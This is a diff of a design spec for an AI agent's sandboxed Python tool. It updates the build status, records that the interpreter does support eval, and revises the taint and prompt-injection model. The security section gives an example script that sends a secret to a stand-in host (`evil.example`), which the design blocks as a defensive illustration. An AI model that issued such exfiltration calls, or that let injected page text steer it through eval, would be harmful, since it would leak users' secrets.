@@ -1,6 +1,7 @@
 # tern `python`: sandboxed compute that calls tools, not the network
 
-Status: draft, 2026-11-04. Not built. Builds on T0 (effects), T3a (taint), T3 (outbox, autonomy) and the step journal.
+Status: PY0 built (2026-11-04): read-only compute in-process, see §9 and DECISIONS.md PY0. PY1–PY3 not built.
+Builds on T0 (effects), T3a (taint), T3 (outbox, autonomy) and the step journal.
 Interpreter: [Monty](https://pydantic.dev/monty), Pydantic's Python subset written in Rust. Monty facts below were
 checked against Monty 1.4.0 on 2026-11-04 (§11). Related:
 - [personal-agent-tooling-spec.md](personal-agent-tooling-spec.md) §5 (effects, outbox, taint, autonomy), §12 (stages).
@@ -26,10 +27,10 @@ checked against Monty 1.4.0 on 2026-11-04 (§11). Related:
 - **Resume by re-running, not by snapshots.** The clock is frozen, `random` is seeded from the run, and every host
   call's result is journaled. A script interrupted by a crash runs again from the top, and its host calls are
   answered from the journal. Divergence is caught by the journal's existing input hash.
-- **Out of process.** The daemon runs scripts in `tern __monty-exec`, a helper child process under the existing
+- **Out of process (PY1).** The daemon runs scripts in `tern __monty-exec`, a helper child process under the existing
   Seatbelt/Landlock profile with network off. Monty's memory limit counts at the global allocator, so a per-script
   process is also the only clean way to cap memory. A crash, a stack overflow or a Monty bug kills the helper, not the
-  daemon.
+  daemon. **PY0 runs Monty in-process** on its own thread with a 64 MB stack and Monty's own limits (§5.2).
 - **Cost.** Monty is pure Rust and MIT. It adds an estimated 3–8 MB to the binary (PY0 measures this), and it needs
   Rust 1.96 where tern declares 1.89. The language is a subset: no classes with inheritance, no generators, no
   pandas or numpy. For those, `shell` with `python3` stays, and asks every time.
@@ -91,7 +92,7 @@ and CSV, regex, dates) is in the subset.
   {"median": 412000, "n": 24, "mine_rank": 7}
   printed:
   looked up 24 of 24
-  host calls: lua__county__lookup ×24 (24 ok, 0 failed)
+  tool calls: lua__county__lookup ×24
   ```
 
   `result` is omitted when the last statement isn't an expression or evaluates to `None`. Values that don't map to
@@ -232,9 +233,11 @@ look to the user (one card per write, or one card per script, §10) deserves rea
   rebuilt on replay from the journaled `untrusted` flag, as for any tool step.
 - **The script's own result is then untrusted**, and reaches the model wrapped in `<untrusted source="python">`. A
   script that summarizes 40 web pages has to pass on some of their text, so its summary is untrusted too.
-- **Inside the script, untrusted data is data.** Monty has no `eval`/`exec` (to be confirmed in PY0, §10), and the
-  host provides no way to turn a string into code. Injected text in a page can change what the script *computes*. It
-  cannot change which calls the script makes unless the script's own logic branches on it. That's a real improvement
+- **Inside the script, untrusted data is data, unless the script evals it.** Checked in PY0: Monty *does* have
+  `eval` (`eval('1+1')` is 2). A script that evals text it fetched could be steered by that text, but only within
+  what the script could do anyway: the same callable tools, each checked with the run's taint, which that fetch has
+  already set. Short of `eval`, injected text in a page can change what the script *computes*. It cannot change
+  which calls the script makes unless the script's own logic branches on it. That's a real improvement
   on the model reading 40 pages into its context, where every page gets a turn at steering it.
 - **The tainted host limit still bites.** A script that reads an untrusted page and then calls
   `http_fetch(f"https://evil.example/?q={secret}")` hits a new host in a tainted run, so the call asks (§3.4) and shows
@@ -324,9 +327,16 @@ per-connector rate limits, and are subject to the run's cancellation token. A ca
 Compilation isn't charged to Monty's time budgets. Monty caps it structurally (200 levels of AST nesting, among
 others), and the helper's wall clock covers the rest.
 
-### 5.2 The helper process
+### 5.2 The helper process (PY1)
 
-The daemon never runs Monty in its own process. It runs `tern __monty-exec`, the same trick as `tern __sandbox-exec`
+**PY0 runs Monty in the daemon's process**, on a dedicated thread with a 64 MB stack, talking to the async side over
+channels shaped like the protocol below, so moving it out is a transport change. What PY0 gives up, and PY1 restores:
+a native crash (Monty's README says an abort inside it "takes your process with it") ends the daemon, and
+`max_memory` is enforced only by Monty's own pre-checks of predictable sizes (`'x' * 10**9` is refused), not by
+counting every allocation, which needs `monty-alloc` as a per-process global allocator. Time limits, recursion and
+tern's host-call cap are fully enforced in PY0.
+
+From PY1 the daemon never runs Monty in its own process. It runs `tern __monty-exec`, the same trick as `tern __sandbox-exec`
 on Linux (sandbox-design.md): `main` checks for the argument before clap.
 
 Why out of process:
@@ -490,22 +500,20 @@ stub_budget = 2048          # bytes of function stubs in the prompt
 
 | Phase | Scope | Size | Exit criteria |
 |---|---|---|---|
-| **PY0** spike | Add `monty` at an exact version behind a `python` cargo feature. Decide the MSRV (§10). `tern __monty-exec` with the protocol, limits and OS sandbox; no host functions. Measure the binary on macOS arm64 and musl x86_64 and aarch64. Fuzz determinism (run each of 200 generated scripts twice with the same clock and seed; outputs must match). Confirm no `eval`/`exec`. `cargo deny` | S | Builds static on musl; binary growth measured and ≤ 8 MB; a memory bomb, an infinite loop, deep recursion and a native-stack overflow (`sorted` with a recursive key) each end with a clean error and the daemon unaffected |
-| **PY1** read-only compute | The `python` tool; host functions for `read` tools (§3.1–3.3); sub-step journaling and deterministic re-run (§4); taint (§3.6); mid-script approvals for reads that ask (§3.4); the read-only workspace mount; async `gather`; errors and hints (§6.2); `reuse_reads`; the `## Compute` prompt section; `runs show` and inspector nesting; DECISIONS entry | M | The motivating case: with the county connector, "compare my address with 30 neighbours" runs one `python` step with 31 journaled `lua__county__lookup` sub-steps and no `shell`. Kill the daemon at call 15: on resume, calls 1–15 aren't repeated. A script reading an untrusted page then `http_fetch`ing a new host asks |
+| **PY0** read-only compute (**built**) | Monty 1.4.0 pinned, MSRV 1.96, `python` cargo feature (default on). The `python` tool in-process (§5.2); host functions for `read` tools (§3.1–3.3), by tool name, synchronous; sub-step journaling and deterministic re-run (§4.1) with a journaled clock and seed; taint (§3.6); reads that would ask, and every write, refused with `PermissionError`; the read-only workspace mount; time, memory, host-call, code and output limits; errors and hints (§6.2); a `## Compute` prompt section; `runs show` lines for sub-steps | M | Met: a script loops over a Luau connector with one journaled sub-step per call; a crash mid-script resumes without repeating calls (the connector's own counter proves it); an untrusted result taints the run and the output; a write tool is refused; limits and unsupported features give clean errors with hints |
+| **PY1** isolation and asking | `tern __monty-exec` helper under the OS sandbox, `monty-alloc` there (§5.2); mid-script approvals for reads that ask (§3.4); async host functions and `gather` with `max_parallel`; `reuse_reads`; stub list in the prompt; the run inspector nesting sub-steps; determinism fuzz; `cargo deny`; musl builds verified; `[python]` config | M | The motivating case with 30 neighbours through `gather`; a script reading an untrusted page then `http_fetch`ing a new host asks (needs T3's host limit); a native stack overflow in a script leaves the daemon running |
 | **PY2** writes | `write` host functions behind `allow_writes`; granted writes; asks and outbox deferral returning `queued` (§3.5); `max_writes`; divergence after writes fails safe (§4.2); approval cards show the script | M | A tainted script's `write_file` goes to the outbox once, replays without a second item, and the script's result says `queued` |
 | **PY3** polish | Agent profile defaults and the per-agent ceiling (AP3); type-check scripts against stubs before running; `tern doctor` lines (feature present, sandbox confined, limits); warm helper pool if traces show the need; desktop script viewer | S–M | |
 
-PY0 can start any time; PY1 needs T3 (the outbox's `Gate` API) merged, which it is on the T3 branch. Where it sits in
+PY0 is built on main's T3a API (`approval::check(…, tainted)`); PY1 and PY2 need T3 (the `Gate` API, the host limit, the outbox) merged. Where it sits in
 the tooling spec's stages: alongside stage 2, since it closes a hole in the safety model that stage 2 is about.
 
 ## 10. Open questions
 
-1. **MSRV.** Monty 1.4 needs Rust 1.96; tern declares 1.89. Options: bump the workspace to 1.96 (tern ships binaries,
-   so the MSRV mostly matters to people building from source), or pin an older Monty if one builds on 1.89 (none
-   known; pinning old versions of a weekly-release project is its own risk). Recommendation: bump, in PY0.
-2. **Default on or behind a feature?** If PY0 measures ≤ 5 MB, ship it in the default build: the tool is part of the
-   safety story, not an extra. If it is near 8 MB, keep it behind `python` in the default release features but
-   off for minimal builds. The 25 MB budget holds either way (14 MB today).
+1. ~~**MSRV.**~~ Decided in PY0: bumped to 1.96 (CI builds on stable).
+2. ~~**Default on or behind a feature?**~~ Decided after PY0: on by default. PY0 measured +6.0 MB on macOS arm64
+   (22.9 → 28.9 MB, with Monty's crates at `opt-level = "s"`), past the 25 MB budget; the tool wins (DECISIONS.md
+   PY0). The `python` feature stays for minimal builds.
 3. **Writes from loops**: one approval card per write (simple, consistent) or a "plan" card per script listing every
    write, approved together and executed once through the outbox? The second is better UX for "send these 12
    reminders", and costs a two-phase script run (plan, then execute). Decide after PY1 is in use.
